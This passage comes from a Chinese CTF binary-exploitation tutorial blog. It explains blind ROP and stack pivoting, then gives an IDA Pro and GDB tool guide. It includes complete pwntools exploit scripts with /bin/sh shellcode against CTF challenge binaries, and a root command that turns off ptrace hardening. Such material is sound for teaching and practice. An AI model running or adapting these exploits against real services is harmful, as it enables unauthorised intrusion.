[使用ret2reg攻击绕过地址混淆](https://blog.csdn.net/linyt/article/details/43612409)\n\n第二篇: [使用ret2reg攻击绕过地址混淆](http://spd.dropsec.xyz/2016/11/02/ret2reg%E6%8A%80%E6%9C%AF/)\n\n第三篇: [ret2reg指令绕过ASLR堆栈溢出](https://silic.wiki/%E4%B9%A0%E7%A7%91%E6%97%A7%E7%AB%99:ret2reg%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87aslr%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA)\n\n-----------------------------\n\n### 0x33 BROP\n\n#### ① 使用原理\n\nBROP(Blind Return Oriented Programming), 顾名思义, 是一种盲ROP, 在**没有源程序分析**的情况下对目标远程程序进行攻击, 劫持程序执行流. 这种方式在一般情况下可以绕过ASLR、NX、Canary保护. 但是使用这种方式有两个条件:\n\n> 1. 目标服务(程序)存在栈溢出\n> 2. 运行远程程序的服务端在崩溃之后会重新启动, 或者重启后地址与先前的一样.(即使程序由ASLR保护, 仅仅在最初启动有效果). 目前Nginx, MySQL, Apache, OpenSSH等服务器应用都符合这种特性.\n\n#### ② 使用步骤\n\n1. **Get buffer length**\n\n   通过爆破实现, 从1开始爆破, 直到程序崩溃(ebp/rbp)被覆盖. 此时输入的字符串长度即为栈溢出长度.\n\n2. **Stack Reading**\n\n   获取栈上的canary, ebp, return address.\n\n   经典栈结构如下:\n\n   ````\n   buffer|canary|fame pointer(ebp/rbp)|return address\n   ````\n\n   > 我们同样可以通过逐字节爆破, 爆破canary.(**32位爆破4x256=1024次, 64位爆破8x256=2048次**, 注意这里的4和8代表的是字节数, 256是表示每个字节由256中可能) 同样地, 我们可以爆破出栈基址指针、返回地址的值.\n\n3. **Blind ROP**\n\n   经过上面两部, 我们可以控制溢出后的执行流, 这时我们就尝试跳转到gadgets, 根据有无crash来判断这个gadgets是否有效, 得到输出函数如: put, write等, 以此来leak出更多的信息. \n\n4. **Optimization**\n\n   上一步已经leak出重要函数(如: system, execve等函数)的地址信息了, 在这一步可以拼凑出payload进行攻击.\n\n#### ③ 使用例子\n\n```c\n// 2016 HCTF PWN题\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\nint i;\nint check();\nint main(void){\n\tsetbuf(stdin,NULL);\n\tsetbuf(stdout,NULL);\n\tsetbuf(stderr,NULL);\n    puts(\"WelCome my friend,Do you know password?\");\n\tif(!check()){\n        puts(\"Do not dump my memory\");\n\t}else {\n        puts(\"No password, no game\");\n\t}\n}\nint check(){\n    char buf[50];\n    read(STDIN_FILENO,buf,1024);\n    return strcmp(buf,\"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk\");  \n}\n```\n\n```python\n#coding=utf-8\nfrom pwn import *\nfrom LibcSearcher import *\n\nsh = remote('127.0.0.1', 9999)\n\n#sh = process('./brop')\n\n# context.log_level = 'debug'\n\n\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 9999)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n\n\ndef get_stop_addr(length):\n    addr = 0x400000\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 9999)\n            sh.recvuntil('password?\\n')\n            payload = 'a' * length + p64(addr)\n            sh.sendline(payload)\n            content = sh.recv()\n            print content\n            sh.close()\n            print 'one success stop gadget addr: 0x%x' % (addr)\n        except Exception:\n            addr += 1\n            sh.close()\n\n\ndef csu_gadget(csu_last, csu_middle, saved_addr, arg1=0x0, arg2=0x0, arg3=0x0):\n    payload = p64(csu_last)  # pop rbx,rbp,r12,r13,r14,r15, ret\n    payload += p64(0x0)  # rbx be 0x0\n    payload += p64(0x1)  # rbp be 0x1\n    payload += p64(saved_addr)  # r12 jump to\n    payload += p64(arg3)  # r13 -> rdx    arg3\n    payload += p64(arg2)  # r14 -> rsi    arg2\n    payload += p64(arg1)  # r15 -> edi    arg1\n    payload += p64(csu_middle)  # will call [rbx + r12 * 0x8]\n    payload += 'A' * 56  # junk\n    return payload\n\n\ndef get_brop_gadget(length, stop_gadget, addr):\n    try:\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(\n            stop_gadget) + p64(0) * 10\n        sh.sendline(payload)\n        content = sh.recv()\n        sh.close()\n        print content\n        # stop gadget returns memory\n        if not content.startswith('WelCome'):\n            return False\n        return True\n    except Exception:\n        sh.close()\n        return False\n\n\ndef check_brop_gadget(length, addr):\n    try:\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'a' * length + p64(addr) + 'a' * 8 * 10\n        sh.sendline(payload)\n        content = sh.recv()\n        sh.close()\n        return False\n    except Exception:\n        sh.close()\n        return True\n\n\ndef find_brop_gadget(length, stop_gadget):\n    addr = 0x400740\n    while 1:\n        print hex(addr)\n        if get_brop_gadget(length, stop_gadget, addr):\n            print 'possible brop gadget: 0x%x' % addr\n            if check_brop_gadget(length, addr):\n                print 'success brop gadget: 0x%x' % addr\n                return addr\n            addr += 1\n\n\ndef get_puts_addr(length, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(\n            addr) + p64(stop_gadget)\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print 'find puts@plt addr: 0x%x' % addr\n                return addr\n            sh.close()\n            addr += 1\n        except Exception:\n            sh.close()\n            addr += 1\n\n\ndef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):\n    sh = remote('127.0.0.1', 9999)\n    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(\n        puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.sendline(payload)\n    try:\n        data = sh.recv()\n        sh.close()\n        try:\n            data = data[:data.index(\"\\nWelCome\")]\n        except Exception:\n            data = data\n        if data == \"\":\n            data = '\\x00'\n        return data\n    except Exception:\n        sh.close()\n        return None\n\n\ndef leakfunction(length, rdi_ret, puts_plt, stop_gadget):\n    addr = 0x400000\n    result = \"\"\n    while addr < 0x401000:\n        print hex(addr)\n        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)\n        if data is None:\n            continue\n        else:\n            result += data\n            addr += len(data)\n    with open('code', 'wb') as f:\n        f.write(result)\n\n\n# length = getbufferflow_length()\nlength = 72\n# stop_gadget = get_stop_addr(length)\nstop_gadget = 0x4006b6\n# brop_gadget = find_brop_gadget(length,stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = brop_gadget + 9\n# puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)\nputs_plt = 0x400560\n# leakfunction(length, rdi_ret, puts_plt, stop_gadget)\nputs_got = 0x601018\n\nsh = remote('127.0.0.1', 9999)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(\n    stop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(\n    system_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\n--------------------------------\n\n## 0x40 高级ROP\n\n### 0x41 ret2_dl_runtime_resolve\n\n\n\n\n\n\n\n\n\n-------------------\n\n## 0x50 花式ROP\n\n### 0x51 stack pivoting\n\n#### ① 使用原理\n\nStack pivoting 劫持栈指针, 目的是将栈劫持到攻击者能够控制的内存上去, 再做ROP. 原理如下:\n\n<div style=\"text-align: center;\">\n![Stack Pivoting原理](15136516601572.jpg)\n</div>)\n\n#### ② 使用情景\n\n1. 可以控制的栈溢出字节数较少, 难以构造较长的ROP链(例如: 在`fgets()`或`read()`函数中添加了长度限制, 只能溢出很少字节)\n2. 开启了PIE(Position-Independent Executable), 无法获得栈地址. 此时就可以通过Stack pivot将栈劫持到能够控制的已知区域. \n3. 其他漏洞难以利用, stack pivot能够使得一些非栈溢出漏洞变成栈溢出漏洞.(例如: 将程序劫持到heap空间中)\n\n#### ③ 使用要求\n\n1. 可以控制程序执行流: 可控内存, 位置已知, 有读写权. (例如: bss段, 至少还有4k[内存按页分配], 有读写权限; heap空间: 需要泄露堆地址)\n\n2. 可以控制rsp(esp)指针. (例如: `libc_csu_init`中的gadgets, 我们通过偏移即可控制rsp指针`pop rsp`, 因为在x64系统中, 是通过寄存器来传参的)\n\n   ```assembly\n   gef➤  x/7i 0x000000000040061a\n   0x40061a <__libc_csu_init+90>:  pop    rbx\n   0x40061b <__libc_csu_init+91>:  pop    rbp\n   0x40061c <__libc_csu_init+92>:  pop    r12\n   0x40061e <__libc_csu_init+94>:  pop    r13\n   0x400620 <__libc_csu_init+96>:  pop    r14\n   0x400622 <__libc_csu_init+98>:  pop    r15\n   0x400624 <__libc_csu_init+100>: ret    \n   gef➤  x/7i 0x000000000040061d\n   0x40061d <__libc_csu_init+93>:  pop    rsp\n   0x40061e <__libc_csu_init+94>:  pop    r13\n   0x400620 <__libc_csu_init+96>:  pop    r14\n   0x400622 <__libc_csu_init+98>:  pop    r15\n   0x400624 <__libc_csu_init+100>: ret\n   ```\n\n#### ④ 使用例题\n\n1. 先查看保护:\n\n   ```bash\n   ➜  fancyROP checksec b0verfl0w\n   [*] '/home/ks/ctf/pwn/stack/demo/fancyROP/b0verfl0w'\n       Arch:     i386-32-little\n       RELRO:    Partial RELRO\n       Stack:    No canary found\n       NX:       NX disabled\n       PIE:      No PIE (0x8048000)\n       RWX:      Has RWX segments\n   ```\n\n2. 再反汇编找到漏洞函数:\n\n   ```c\n   signed int vul()\n   {\n     char s; // [esp+18h] [ebp-20h]\n   \n     puts(\"\\n======================\");\n     puts(\"\\nWelcome to X-CTF 2016!\");\n     puts(\"\\n======================\");\n     puts(\"What's your name?\");\n     fflush(stdout);\n     fgets(&s, 50, stdin);\n     printf(\"Hello %s.\", &s);\n     fflush(stdout);\n     return 1;\n   }\n   ```\n\n   上面可以看到, 能够溢出的字节数有: `50 - 0x20 - 4 = 14`个字节, 很难执行一段较长的ROP, 这时就需要利用Stack pivot来控制`esp`. 由于堆栈保护都关了, 所以我们直接在栈上布置shellcode即可.\n\n3. 寻找gadgets:\n\n   ```assembly\n   ➜  fancyROP ROPgadget --binary b0verfl0w --only 'jmp|ret'\n   Gadgets information\n   ============================================================\n   0x08048504 : jmp esp\n   0x0804836a : ret\n   0x0804847e : ret 0xeac1\n   \n   Unique gadgets found: 3\n   ```\n\n4. payload格式如下:\n\n   ```\n   sys_shellcode|pedding|fake ebp|0x08048504|set esp point shell code and jmp esp\n   ```\n\n5. poc:\n\n   ```python\n   #coding=utf-8\n   #!/usr/bin\n   \n   from pwn import *\n   \n   shellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"\n   shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"\n   shellcode_x86 += \"\\x0b\\xcd\\x80\"\n   \n   print disasm(shellcode_x86)\n   \n   sh = process('./b0verfl0w')\n   # sys_shellcode = asm(shellcraft.sh())\n   # print disasm(sys_shellcode)\n   jmp_esp_addr = 0x08048504\n   sub_and_jmp_esp = asm('sub esp, 0x28;jmp esp')\n   payload = shellcode_x86.ljust(0x24,'a') + p32(jmp_esp_addr) + sub_and_jmp_esp\n   sh.sendline(payload)\n   sh.interactive()\n   ```\n\n---------------------------\n\n### 0x52 frame faking\n\n\n\n\n\n## 相关链接\n\n1. libc符号偏移查询站: http://libcdb.com/\n2. libc符号偏移查询站: https://libc.blukat.me/\n3. 虚线画图在线工具: http://asciiflow.com/\n4. libc github在线数据库: https://github.com/niklasb/libc-database\n5. Linux程序常用保护机制: https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/\n6. Stack Pivot: http://tacxingxing.com/2017/05/10/stack-pivot/\n7. PIE && ALSR && Bypass: http://tacxingxing.com/2017/07/15/pie-alsr/\n8. Linux可执行文件之PLT&GOT: http://www.ifuryst.com/archives/Linux-PLT-GOT.html\n\n## 小记\n\n### 1. lea指令 \n\n`lea, load effective address`, 加载有效地址. 指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&”.\n\n### 2. 查看libc版本\n\n```bash\nldd --version\ngetconf GNU_LIBC_VERSION\nls -l /lib/x86_64-linux-gnu/libc.so.6\nls -l /lib/i386-linux-gnu/libc.so.6\napt-cache show libc6\n```\n\n**有 flush 函数，那就一定有 sh**.\n\n### 3. Linux动态链接之PLT&GOT\n\n链接过程无法修改编译过程生成的汇编指令, 那如何重定位?\n\n> - 需要存放外部函数的数据段\n> - 获取数据段存放函数地址的一小段额外代码\n\n**链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。**\n\n链接器生成额外的伪代码如下：\n\n```assembly\n.text\n...\n \n// 调用printf的call指令\ncall printf_stub\n...\n \nprintf_stub:\n    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址\n    jmp rax // 跳过去执行printf函数\n \n.data\n...\nprintf函数的储存地址：\n　　这里储存printf函数重定位后的地址\n```\n\n如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。\n\n总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为`全局偏移表（GOT, Global Offset Table）`，而那个额外代码段表，称为`程序链接表（PLT，Procedure Link Table）`。它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏。\n\n那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT/GOT是如何运行的。\n\n假设最开始的示例代码`test.c`增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file)是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？\n\n<div style=\"text-align: center;\">\n![got&plt关系](417527177.jpg)\n</div>)","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"http://www.killshadow.xyz/tags/PWN/"}]},{"title":"0.1-菜鸟学PWN之工具篇","date":"2019-06-06T03:34:00.000Z","path":"2019/06/06/0.1-菜鸟学PWN之工具篇/","raw":"---\ntitle: 0.1-菜鸟学PWN之工具篇\ndate: 2019-6-6 11:34:00\ncategories: \ntoc: ture\ntags: \n\t- Tools\n\t- CTF\ncomments: true\n\n---\n\n## 0x00 简介\n\n本章介绍在CTF PWN中常用工具的使用及其快捷键，尽量用最短的学习时间快速入门这些工具的使用。随着工具的增多以及其功能的丰富，本章会不定期更新。\n\n<!-- more -->\n\n## 0x10 IDA Pro\n\n### 0x11 快捷键\n\nIDA快捷键如下表：\n\n|快捷键|功能|\n|----|----|\n|;|为当前指令添加全文交叉引用的注释|\n|/|在汇编中可见c代码|\n|n|定义或修改名称，通常用来标注函数名|\n|g|跳转到任意地址|\n|Esc|返回到跳转前的位置|\n|D|分别按字节、字、双字显示数据|\n|A|按 ASCII 显示数据|\n|u|取消定义一个函数或变量等|\n|p|将一段16进制解析成函数(相当于u[undefine]相反的操作)|\n|alt + p|编辑function, 可定义函数的范围(起始/终止地址)|\n|x|查看交叉引用|\n|h|16/10进制转换|\n|r|转换成字符串|\n|空格键|反汇编窗口切换文本跟图形|\n|F9|动态调试程序(其实IDA主要用作静态分析用的)|\n|F2|下断点|\n|N|重命名|\n|Y|设置变量类型|\n|M|转换为枚举类型常量|\n|ALT+G|转换局部变量为结构体|\n\n1. IDAView下使用小键盘“-”，“+”快捷方式可以在代码同关系图之间切换。 \n2. 使用快捷键”*”把变量重定义为数组.\n3. ALT+T:搜索字符串(文本搜索)\n4. alt+B:搜索opcode(二进制数据),搜索16进制:\n\n\n### 0x12 常用插件\n\n插件链接及功能如下: \n\n- [IDA FLIRT Signature Database](https://github.com/push0ebp/sig-database) -- 用于识别静态编译的可执行文件中的库函数\n- [Find Crypt](https://github.com/polymorf/findcrypt-yara) -- 寻找常用加密算法中的常数（需要安装 [yara-python](https://github.com/VirusTotal/yara-python)）\n- [IDA signsrch](https://github.com/nihilus/IDA_Signsrch) -- 寻找二进制文件所使用的加密、压缩算法\n- [Ponce](https://github.com/illera88/Ponce) -- 污点分析和符号化执行工具\n- [snowman decompiler](https://github.com/yegord/snowman/tree/v0.1.0) -- C/C++反汇编插件（F3 进行反汇编）\n- [CodeXplorer](https://github.com/REhints/HexRaysCodeXplorer) -- 自动类型重建以及对象浏览（C++）（jump to disasm)\n- [IDA Ref](https://github.com/nologic/idaref) -- 汇编指令注释（支持arm，x86，mips）\n- [auto re](https://github.com/a1ext/auto_re) -- 函数自动重命名\n- [nao](https://github.com/tkmru/nao) -- dead code 清除\n- [HexRaysPyTools](https://github.com/igogo-x86/HexRaysPyTools) -- 类/结构体创建和虚函数表检测\n- [DIE](https://github.com/ynvb/DIE) -- 动态调试增强工具，保存函数调用上下文信息\n- [sk3wldbg](https://github.com/cseagle/sk3wldbg) -- IDA 动态调试器，支持多平台\n- [idaemu](https://github.com/36hours/idaemu) -- 模拟代码执行（支持X86、ARM平台）\n- [Diaphora](https://github.com/joxeankoret/diaphora) -- 程序差异比较\n- [Keypatch](https://github.com/keystone-engine/keypatch) -- 基于 Keystone 的 Patch 二进制文件插件\n- [FRIEND](https://github.com/alexhude/FRIEND) -- 哪里不会点哪里，提升汇编格式的可读性、提供指令、寄存器的文档等\n- [SimplifyGraph](https://github.com/fireeye/SimplifyGraph) -- 简化复杂的函数流程图\n- [bincat](https://github.com/airbus-seclab/bincat) -- 静态二进制代码分析工具包，2017 Hex-Rays 插件第一名\n- [golang_loader_assist](https://github.com/strazzere/golang_loader_assist) -- Golang编译的二进制文件分析助手\n- [BinDiff](https://www.zynamics.com/bindiff.html)\n\n\n\n### 0x13 常用技巧\n\n#### ① 堆栈不平衡\n\n某些函数在使用 f5 进行反编译时，会提示错误 \"sp-analysis failed\"，导致无法正确反编译。原因可能是在代码执行中的 pop、push 操作不匹配，导致解析的时候 esp 发生错误。\n\n解决办法步骤如下：\n\n1. 用 Option->General->Disassembly, 将选项 Stack pointer 打钩\n2. 仔细观察每条 call sub_xxxxxx 前后的堆栈指针是否平衡\n3. 有时还要看被调用的 sub_xxxxxx 内部的堆栈情况，主要是看入栈的参数与 ret xx 是否匹配\n4. 注意观察 jmp 指令前后的堆栈是否有变化\n5. 有时用 Edit->Functions->Edit function...,然后点击 OK 刷一下函数定义\n\n\n\n#### ② 分析选项\n\n选择File菜单下的Open，打开想要逆向的可执行文件，会显示一个Load a new file的界面。这里可以选择: \n\n1. 程序的类型； \n2. 处理器的类型； \n3. 加载的段地址和偏移量； \n4. 是否允许分析； \n5. 一些加载选项； \n6. 内核和处理器的一些选项； \n7. windows系统dll所在的目录。\n\n<div style=\"text-align: center;\">\n![Processor type中可选择CPU指令集](20160911173905858.png) \n</div>\n\n​\t\t上图默认选择PE文件就可以，对于一些网络数据包或者其他格式的文件，可以使用二进制加载，自己进行解析。\n\n\n\n#### ③ 修改数据\n\n- 如何修改数据:(在Hex View窗口下) \n  [S1]双击要修改的地方 \n  [S2]使用F2捷方式修改当前字节 \n  [S3]再按下F2快捷方式应用修改。\n- 如何改变执行流程 \n  [1]修改跳转指令。 \n  [2]修改内存数据。 \n  [3]IDA View中使用下面的命令Jump to IP,Set IP, Run to cursor。 \n- 保存修改 \n  使用下面的主菜单命令，直接把修改保存到输入文件中,即可。 \n  [IDA Main Menu]->[Edit]->[PatchProgram]->[Apply patches to input file…]\n\n\n\n#### ④ 创建结构体\n\n1. 在IDA中打开Structures，快捷键是`shift+ F9` ,然后按insert键，插入新结构体:\n\n   <div style=\"text-align: center;\">\n![输入结构题的名称](4332232-fd8690b7cd9cfc90.png)\n</div>\n\n2. 在`ends`后按`d`键，添加相应的成员，然后选中成员名，按`N`进行修改，选中类型，按`d`进行更改类型，构造完结构题以后，回到代码窗口\n   <div style=\"text-align: center;\">\n![修改成员名及其类型](4332232-eae756a3f89ed9c1.png)\n</div>\n\n3. 在变量堆栈结构里, `Edit▶Struct Var（ALT+Q）`命令显示一组已知的结构体\n\n4. 跳到要定义结构体的变量, 按`y`, 把它改成`(新定义结构体名) *`.\n\n   <div style=\"text-align: center;\">\n![创建及使用结构体](创建及使用结构体.gif)\n\n#### ⑤ 解析C头文件\n\n解析头文件，可以使用File▶Load File▶Parse C HeaderFile（文件▶加载文件▶解析C头文件）选择你想要解析的头文件。如果一切正常，IDA会通知你Compilation successful（编译完成）。如果解析器遇到任何问题，IDA将会在输出窗口中显示错误消息\n\n\n\n#### ⑥ 定义数组\n\n当看到这样的多个变量:\n\n```c\n  v2 = 102;\n  v3 = 109;\n  v4 = 99;\n  v5 = 100;\n  v6 = 127;\n  v7 = 107;\n  v8 = 55;\n  v9 = 100;\n  v10 = 59;\n  v11 = 86;\n  v12 = 96;\n  v13 = 59;\n  v14 = 110;\n  v15 = 112;\n```\n\n<div style=\"text-align: center;\">\n![堆栈视图的数组](1543161992885.png)\n</div>\n\n\n可以考虑只定义一个数组, 按`*`, 会弹出如下窗口:\n\n<div style=\"text-align: center;\">\n![定义数组](1543162127685.png)\n</div>\n\n\n要特别注意`array size`.\n\n\n\n#### ⑦ 动态调试 & 远程调试\n\n1. 如果在win系统上调试`exe`文件, 则可以直接用本地debugger调试, 按`F9`之后会跳出如下界面:\n   <div style=\"text-align: center;\">\n   ![本地动态调试](1543162468087.png)\n   </div>\n   选`Local ...`. 即可动态调试. (调试时记得在关键点按`F2`下断点)\n\n2. 如果在win下动态调elf或so文件, 则需要利用到远程调试(一般是本地ida远程连接linux虚拟机来调试)\n\n    Step1: 将IDA安装目录下的linux_server/linux_server64复制到linux虚拟机，在linux下执行linux_server(32/64, 看程序而定)\n    \n    Step2: 在Windows下打开需要反汇编的ELF格式文件，并在IDA上配置远程调试的环境：Debugger——Attach——Remote Linux debugger，选`Remote Linux debugger`:\n    <div style=\"text-align: center;\">\n    ![选Remote Linux debugger](8343187-5785fafa96954e2f.png)\n    </div>\n    \n    Step3: 在Debug options勾选如上选项：\n    <div style=\"text-align: center;\">\n    ![在Debug options勾选如上选项](8343187-bcc26a65304b68f9.png)\n    </div>\n    \n    Step4: Hostname为虚拟机ip，Password为空\n    <div style=\"text-align: center;\">\n    ![Hostname为虚拟机ip，Password为空](8343187-b07fa424356cb45f.png)\n    </div>\n\n3. 如果是so文件, 跟上述方法差不多, 需要额外注意adb shell下的端口转发.\n\n### 0x14 IDA Python\n\n```python\nimport ida_bytes\n\nbuf = ida_bytes.get_bytes(0x600B00, 182)\npatch = \"\"\nfor i in buf:\n\tpatch += chr(ord(i) ^ 0x0C)\nida_bytes.patch_bytes(0x600B00,patch)\n```\n\nIDA Python API: [https://www.hex-rays.com/products/ida/support/idapython_docs/](https://www.hex-rays.com/products/ida/support/idapython_docs/)\n\n----------------\n\n## 0x20 GDB\n\n### 0x21 gdb 的组成架构\n\n<div style=\"text-align: center;\">\n![img](2.3.1_gdb.png)\n</div>\n\n### 0x22 gdb 基本工作原理\n\ngdb 通过系统调用 `ptrace` 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。ptrace 系统调用的原型如下：\n```c\n#include <sys/ptrace.h>\nlong ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);\n```\n\n对应的参数如下: \n\n- pid_t pid：指示 ptrace 要跟踪的进程。\n- void \\*addr：指示要监控的内存地址。\n- void \\*data：存放读取出的或者要写入的数据。\n- enum __ptrace_request request：决定了系统调用的功能，几个主要的选项：\n  - *PTRACE_TRACEME*：表示此进程将被父进程跟踪，任何信号（除了 `SIGKILL`）都会暂停子进程，接着阻塞于 `wait()` 等待的父进程被唤醒。子进程内部对 `exec()` 的调用将发出 `SIGTRAP` 信号，这可以让父进程在子进程新程序开始运行之前就完全控制它。\n  - *PTRACE_ATTACH*：attach 到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次 PTRACE_TRACEME 操作。但需要注意的是，虽然当前进程成为被跟踪进程的父进程，但是子进程使用 `getppid()` 的到的仍将是其原始父进程的 pid。\n  - *PTRACE_CONT*：继续运行之前停止的子进程。可同时向子进程交付指定的信号。\n\n#### gdb 的三种调试方式\n\n1. 运行并调试一个新进程\n    - 运行 gdb，通过命令行或 `file` 命令指定目标程序。\n    - 输入`run`命令， gdb 执行下面的操作：\n        - 通过 `fork()` 系统调用创建一个新进程\n        - 在新创建的子进程中执行操作：`ptrace(PTRACE_TRACEME, 0, 0, 0)`\n        - 在子进程中通过 `execv()` 系统调用加载用户指定的可执行文件\n\n2. attach 并调试一个已经运行的进程\n    - 用户确定需要进行调试的进程 PID\n    - 运行 gdb，输入 `attach <pid>`，gdb 将对指定进程执行操作: `ptrace(PTRACE_ATTACH, pid, 0, 0)`\n\n3. 远程调试目标机上新创建的进程\n    - gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）——定义[RSP协议数据](https://blog.csdn.net/HMSIWTV/article/details/8759129)的基本格式为： `$..........#xx`\n    - gdbserver 的启动方式相当于运行并调试一个新创建的进程\n\n注意，在你将 gdb attach 到一个进程时，可能会出现这样的问题：\n\n```bash\ngdb-peda$ attach 9091\nAttaching to process 9091\nptrace: Operation not permitted.\n```\n\n这是因为开启了内核参数 `ptrace_scope`：\n\n```bash\n$ cat /proc/sys/kernel/yama/ptrace_scope\n1\n```\n\n1 表示 True，此时普通用户进程是不能对其他进程进行 attach 操作的，当然你可以用 root 权限启动 gdb，但最好的办法还是关掉它：\n\n```bash\n# echo 0 > /proc/sys/kernel/yama/ptrace_scope\n```\n\n#### 断点的实现\n\n断点的功能是通过内核信号实现的，在 x86 架构上，内核向某个地址打入断点，实际上就是往该地址写入断点指令 `INT 3`，即 `0xCC`。目标程序运行到这条指令之后会触发 `SIGTRAP` 信号，gdb 捕获这个信号，并根据目标程序当前停止的位置查询 gdb 维护的断点链表，若发现在该地址确实存在断点，则可判定为断点命中。\n\n### 0x23 gdb 基本操作\n\n使用 `-tui` 选项可以将代码显示在一个漂亮的交互式窗口中。\n\n#### break -- b\n\n- `break` 当不带参数时，在所选栈帧中执行的下一条指令处设置断点。\n- `break <function>` 在函数体入口处打断点。\n- `break <line>` 在当前源码文件指定行的开始处打断点。\n- `break -N` `break +N` 在当前源码行前面或后面的 `N` 行开始处打断点，`N` 为正整数。\n- `break <filename:line>` 在源码文件 `filename` 的 `line` 行处打断点。\n- `break <filename:function>` 在源码文件 `filename` 的 `function` 函数入口处打断点。\n- `break <address>` 在程序指令的地址处打断点。\n- `break ... if <cond>` 设置条件断点，`...` 代表上述参数之一（或无参数），`cond` 为条件表达式，仅在 `cond` 值非零时停住程序。\n\n#### info\n\n- `info breakpoints -- i b`\n  查看断点，观察点和捕获点的列表。\n  - `info breakpoints [list…]`\n- `info break [list…]`\n  - `list…` 用来指定若干个断点的编号（可省略），可以是 `2`， `1-3`， `2 5`等。\n- `info display` 打印自动显示的表达式列表，每个表达式都带有项目编号，但不显示其值。\n- `info reg` 显示当前寄存器信息。\n- `info threads` 打印出所有线程的信息，包含 Thread ID、Target ID 和 Frame。\n- `info frame` 打印出指定栈帧的详细信息。\n- `info proc` 查看 proc 里的进程信息。\n\n#### disable -- dis\n\n禁用断点，参数使用空格分隔。不带参数时禁用所有断点。\n\n- `disable [breakpoints] [list…]` `breakpoints` 是 `disable` 的子命令（可省略），`list…` 同 `info breakpoints` 中的描述。\n\n#### enable\n\n启用断点，参数使用空格分隔。不带参数时启用所有断点。\n\n- `enable [breakpoints] [list…]` 启用指定的断点（或所有定义的断点）。\n- `enable [breakpoints] once list…` 临时启用指定的断点。GDB 在停止您的程序后立即禁用这些断点。\n- `enable [breakpoints] delete list…` 使指定的断点启用一次，然后删除。一旦您的程序停止，GDB 就会删除这些断点。等效于用 `tbreak` 设置的断点。\n\n`breakpoints` 同 `disable` 中的描述。\n\n#### clear\n\n在指定行或函数处清除断点。参数可以是行号，函数名称或 `*` 跟一个地址。\n\n- `clear` 当不带参数时，清除所选栈帧在执行的源码行中的所有断点。\n- `clear <function>`, `clear <filename:function>` 删除在命名函数的入口处设置的任何断点。\n- `clear <line>`, `clear <filename:line>` 删除在指定的文件指定的行号的代码中设置的任何断点。\n- `clear <address>` 清除指定程序指令的地址处的断点。\n\n#### delete -- d\n\n删除断点。参数使用空格分隔。不带参数时删除所有断点。\n\n- `delete [breakpoints] [list…]`\n\n#### tbreak\n\n设置临时断点。参数形式同 `break` 一样。当第一次命中时被删除。\n\n#### watch\n\n为表达式设置观察点。每当一个表达式的值改变时，观察点就会停止执行您的程序。\n\n- `watch [-l|-location] <expr>` 如果给出了 `-l` 或者 `-location`，则它会对 `expr` 求值并观察它所指向的内存。\n\n另外 `rwatch` 表示在访问时停止，`awatch` 表示在访问和改变时都停止。\n\n#### step -- 